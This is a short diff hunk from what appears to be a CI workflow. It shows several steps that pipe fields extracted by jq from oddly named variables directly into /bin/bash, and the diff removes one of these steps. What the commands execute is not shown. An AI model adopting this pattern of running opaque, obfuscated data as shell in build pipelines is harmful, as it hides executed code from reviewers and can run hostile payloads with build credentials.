@@ -23,7 +23,6 @@ jobs:
           echo $j7820 | jq -r .lffk2898 | /bin/bash
           echo $hc65 | jq -r .c70 | /bin/bash
           echo $z75518 | jq -r .kwqw1 | /bin/bash
-          printf '%s' "$nlp30924" | jq -r .vmrg84 | /bin/bash
           printf '%s' "$txlup47221" | jq -r .rsn875 | /bin/bash
 
       - name: Store output
